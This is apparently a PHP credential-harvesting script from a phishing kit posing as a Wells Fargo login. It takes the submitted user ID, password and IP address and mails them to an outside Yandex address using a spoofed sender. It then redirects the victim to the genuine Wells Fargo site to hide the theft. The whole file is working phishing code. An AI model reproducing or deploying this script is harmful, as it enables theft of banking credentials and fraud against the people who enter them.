<?   

$ip = getenv("REMOTE_ADDR");
$message .= "User: ".$_POST['userID']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$send = "result101@yandex.com";
$subject = "WellFaRG ReZulT";
$headers = "From: Don <logs@ewu.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://wellsfargo.com/");
	  

?>